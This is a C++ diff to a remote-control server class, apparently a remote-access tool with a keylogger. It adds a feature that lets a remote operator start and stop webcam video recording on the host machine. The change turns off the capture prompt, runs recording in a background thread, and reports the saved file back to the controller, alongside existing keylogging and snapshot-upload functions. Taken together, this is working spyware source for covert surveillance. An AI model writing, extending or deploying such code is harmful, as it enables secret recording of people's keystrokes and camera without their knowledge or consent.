@@ -26,12 +26,17 @@ private:
     
     // Webcam state
     std::atomic<bool> webcamActive;
-    
+    std::string currentVideoFile;
+    time_t recordingStartTime; 
+    // Webcam Video Recording State
+    std::thread videoThread;        // MỚI: Thread để chạy quay video
+    HWND hWebcamWnd;                // MỚI: Handle cửa sổ webcam để điều khiển Stop
 public:
     RemoteServer() : serverSocket(INVALID_SOCKET_VALUE), 
                      clientSocket(INVALID_SOCKET_VALUE),
                      keyloggerActive(false),
-                     webcamActive(false) {
+                     webcamActive(false),
+                     hWebcamWnd(NULL) {
         initWinsock();
     }
     
@@ -396,17 +401,107 @@ public:
 #endif
     }
     
-    // Function 10-11: Webcam Control
+    // Function 10: Start Recording - FIX LOGIC KEEP-ALIVE
     void handleWebcamOn() {
+        if (webcamActive) {
+            sendTextResponse(CMD_WEBCAM_ON, "Webcam is already recording!");
+            return;
+        }        
         webcamActive = true;
-        sendTextResponse(CMD_WEBCAM_ON, "Webcam logic active");
+        currentVideoFile = "rec_" + std::to_string(time(0)) + ".avi"; 
+        
+        sendTextResponse(CMD_WEBCAM_ON, "Recording started: " + currentVideoFile);
+
+        videoThread = std::thread([this]() {
+            // Sử dụng biến currentVideoFile thay vì tên cố định
+            std::string filename = currentVideoFile;
+
+
+            
+            #ifdef _WIN32
+            // Tạo cửa sổ capture
+            hWebcamWnd = capCreateCaptureWindowA("WebcamCapture", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
+            
+            if (hWebcamWnd) {
+                if (capDriverConnect(hWebcamWnd, 0)) {
+                    
+                    CAPTUREPARMS CaptureParms; 
+                    capCaptureGetSetup(hWebcamWnd, &CaptureParms, sizeof(CAPTUREPARMS));
+                    
+                    // --- CẤU HÌNH QUAN TRỌNG ---
+                    CaptureParms.fYield = TRUE;                   // Bắt buộc TRUE để xử lý Loop bên dưới
+                    CaptureParms.fAbortLeftMouse = FALSE;
+                    CaptureParms.fAbortRightMouse = FALSE;
+                    CaptureParms.fLimitEnabled = FALSE;           // Tắt giới hạn thời gian
+                    CaptureParms.fMakeUserHitOKToCapture = FALSE; // Không chờ bấm OK
+                    CaptureParms.fCaptureAudio = FALSE;
+                    CaptureParms.dwRequestMicroSecPerFrame = (1000000 / 15); // 15 FPS
+                    BITMAPINFOHEADER bih;
+                    memset(&bih, 0, sizeof(bih));
+                    bih.biSize = sizeof(bih);
+                    bih.biWidth = 160;  // Chiều rộng nhỏ
+                    bih.biHeight = 120; // Chiều cao nhỏ
+                    bih.biPlanes = 1;
+                    bih.biBitCount = 24;
+                    bih.biCompression = BI_RGB;
+                    capSetVideoFormat(hWebcamWnd, &bih, sizeof(bih));
+                    if (capCaptureSetSetup(hWebcamWnd, &CaptureParms, sizeof(CAPTUREPARMS))) {
+                        capFileSetCaptureFile(hWebcamWnd, (char*)filename.c_str());
+                        recordingStartTime = time(0);
+                        // Bắt đầu quay (Non-blocking vì Yield=TRUE)
+                        if (capCaptureSequence(hWebcamWnd)) {
+                            
+                            // === VÒNG LẶP KEEP-ALIVE (FIX LỖI TỰ TẮT) ===
+                            // Giữ thread này sống cho đến khi bấm Stop (webcamActive = false)
+                            MSG msg;
+                            while (webcamActive) {
+                                // Xử lý tin nhắn Windows để cửa sổ capture không bị treo
+                                if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
+                                    TranslateMessage(&msg);
+                                    DispatchMessage(&msg);
+                                }
+                                // Nghỉ nhẹ để giảm tải CPU
+                                std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                            }
+                            // ============================================
+
+                            // Khi vòng lặp kết thúc (do bấm Stop), gửi lệnh dừng
+                            capCaptureStop(hWebcamWnd);
+                        }
+                    }
+                    capDriverDisconnect(hWebcamWnd);
+                }
+                DestroyWindow(hWebcamWnd);
+                hWebcamWnd = NULL;
+            }
+            #endif
+        });
     }
-    
+
+    // Function 11: Stop Recording 
     void handleWebcamOff() {
+        if (!webcamActive) {
+            sendTextResponse(CMD_WEBCAM_OFF, "Webcam is not recording!");
+            return;
+        }
+
+        // 1. Dừng quay
         webcamActive = false;
-        sendTextResponse(CMD_WEBCAM_OFF, "Webcam logic inactive");
-    }
-    
+        long duration = time(0) - recordingStartTime;
+        // 2. Chờ thread kết thúc
+        if (videoThread.joinable()) {
+            videoThread.join();
+        }
+
+        // Chờ file được nhả khóa
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+
+        // 3. Thay vì gửi file, ta gửi TÍN HIỆU báo file đã sẵn sàng trên đĩa
+        std::string msg = "VIDEO_SAVED_LOCAL|" + currentVideoFile + "|" + std::to_string(duration) + " seconds";     
+        sendTextResponse(CMD_WEBCAM_OFF, msg);
+        
+        std::cout << "Recording stopped. File saved: " << currentVideoFile << " Duration: " << duration << " seconds" << std::endl;
+    }  
     // Function 14: Webcam Capture (FIXED: Using sendLargeFile)
     void handleWebcamCapture(const char* data) {
         string filename = "webcam_snap.bmp";
@@ -457,6 +552,14 @@ public:
     }
     
     void stop() {
+        // --- MỚI: Dừng webcam nếu đang quay ---
+        if (webcamActive) {
+            webcamActive = false;
+            #ifdef _WIN32
+            if (hWebcamWnd) capCaptureStop(hWebcamWnd);
+            #endif
+            if (videoThread.joinable()) videoThread.join();
+        }
         keyloggerActive = false;
         if (keylogThread.joinable()) keylogThread.join();
         if (clientSocket != INVALID_SOCKET_VALUE) closesocket(clientSocket);
